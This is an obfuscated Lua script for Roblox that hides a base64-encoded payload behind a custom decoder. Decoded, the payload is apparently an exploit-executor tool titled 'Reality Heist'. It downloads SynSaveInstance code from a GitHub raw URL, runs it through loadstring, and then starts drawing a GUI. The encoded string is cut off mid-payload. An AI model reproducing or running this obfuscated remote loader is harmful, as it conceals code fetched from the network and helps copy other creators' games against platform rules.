--[[ 
    PROTECTED BY TITAN-LOCK V4 (F you)
    UID: 206641 
    TIME: 1768717340
]]

local _Il1l = string.char; 
local _0x1a = string.gsub; 
local _Il11l = string.sub; 
local _0x2b = math.ceil; 
local _Il1l1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"; 

local _0x1 = function(d) 
    -- Filter invalid characters
    d = _0x1a(d, '[^'.._Il1l1..'=]', '') 
    
    -- Decode loop
    return (_0x1a(d, '.', function(x) 
        if (x == '=') then return '' end 
        local r,f='',(string.find(_Il1l1, x, 1, true)-1) 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end 
        local c=0 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return _Il1l(c) 
    end)) 
end 

local _0x99 = "LS0gRGV1cyBFeCBTb3BoaWE6IFJFQUxJVFkgSEVJU1QgW1hlbm8gRWRpdGlvbl0KbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIFR3ZWVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIikKbG9jYWwgQ29yZUd1aSA9IGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKbG9jYWwgUGFyYW1zID0gewogICAgUmVwb1VSTCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbHVhdS9TeW5TYXZlSW5zdGFuY2UvbWFpbi8iLAogICAgU1NJID0gInNhdmVpbnN0YW5jZSIsCn0KCmxvY2FsIHNhdmVpbnN0YW5jZSA9IHNhdmVpbnN0YW5jZQppZiBub3Qgc2F2ZWluc3RhbmNlIHRoZW4KICAgIGxvY2FsIHN1Y2Nlc3MsIHNjcmlwdCA9IHBjYWxsKGdhbWUuSHR0cEdldCwgZ2FtZSwgUGFyYW1zLlJlcG9VUkwgLi4gInNhdmVpbnN0YW5jZS5sdWEiKQogICAgaWYgc3VjY2VzcyB0aGVuCiAgICAgICAgbG9jYWwgbG9hZGVkRm4gPSBsb2Fkc3RyaW5nKHNjcmlwdCkKICAgICAgICBpZiBsb2FkZWRGbiB0aGVuCiAgICAgICAgICAgIGdldGdlbnYoKS5zYXZlaW5zdGFuY2UgPSBsb2FkZWRGbigpCiAgICAgICAgICAgIHNhdmVpbnN0YW5jZSA9IGdldGdlbnYoKS5zYXZlaW5zdGFuY2UKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIFNjcmVlbkd1aSA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKU2NyZWVuR3VpLk5hbWUgPSAiRGV1c0V4U29waGlhX0hlaXN0IgpTY3JlZW5HdWkuUmVzZXRPblNwYXduID0gZmFsc2UKcGNhbGwoZnVuY3Rpb24oKSBTY3JlZW5HdWkuUGFyZW50ID0gQ29yZUd1aSBlbmQpCmlmIG5vdCBTY3JlZW5HdWkuUGFyZW50IHRoZW4gU2NyZWVuR3VpLlBhcmVudCA9IExvY2FsUGxheWVyOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIikgZW5kCgpsb2NhbCBCbHVyID0gSW5zdGFuY2UubmV3KCJCbHVyRWZmZWN0IikKQmx1ci5TaXplID0gMApCbHVyLlBhcmVudCA9IGdhbWU6R2V0U2VydmljZSgiTGlnaHRpbmciKQoKbG9jYWwgTWFpbkZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCk1haW5GcmFtZS5OYW1lID0gIk1haW5GcmFtZSIKTWFpbkZyYW1lLlBhcmVudCA9IFNjcmVlbkd1aQpNYWluRnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE1LCAxNSwgMTUpCk1haW5GcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0yMDAsIDAuNSwgLTEyNSkKTWFpbkZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgMCkKTWFpbkZyYW1lLkNsaXBzRGVzY2VuZGFudHMgPSB0cnVlCk1haW5GcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCk1haW5GcmFtZS5BY3RpdmUgPSB0cnVlCk1haW5GcmFtZS5EcmFnZ2FibGUgPSB0cnVlCgpsb2NhbCBNYWluQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCk1haW5Db3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTYpCk1haW5Db3JuZXIuUGFyZW50ID0gTWFpbkZyYW1lCgpsb2NhbCBNYWluU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpCk1haW5TdHJva2UuUGFyZW50ID0gTWFpbkZyYW1lCk1haW5TdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDYwLCA2MCkKTWFpblN0cm9rZS5UaGlja25lc3MgPSAyCk1haW5TdHJva2UuVHJhbnNwYXJlbmN5ID0gMQoKVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluRnJhbWUsIFR3ZWVuSW5mby5uZXcoMC44LCBFbnVtLkVhc2luZ1N
